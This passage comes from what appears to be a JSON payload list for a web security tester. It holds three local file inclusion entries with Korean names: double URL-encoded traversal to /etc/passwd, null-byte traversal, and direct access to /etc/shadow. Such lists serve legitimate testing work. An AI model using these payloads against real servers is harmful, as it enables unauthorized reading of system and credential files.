        { "id": "lfi_4", "name": "이중 인코딩", "payload": "..%252F..%252F..%252Fetc%252Fpasswd", "description": "이중 URL 인코딩", "risk": "high" },
        { "id": "lfi_5", "name": "Null 바이트", "payload": "../../../etc/passwd%00", "description": "Null 바이트 종료", "risk": "medium" },
        { "id": "lfi_6", "name": "절대 경로", "payload": "/etc/shadow", "description": "직접 절대 경로 접근", "risk": "critical" }
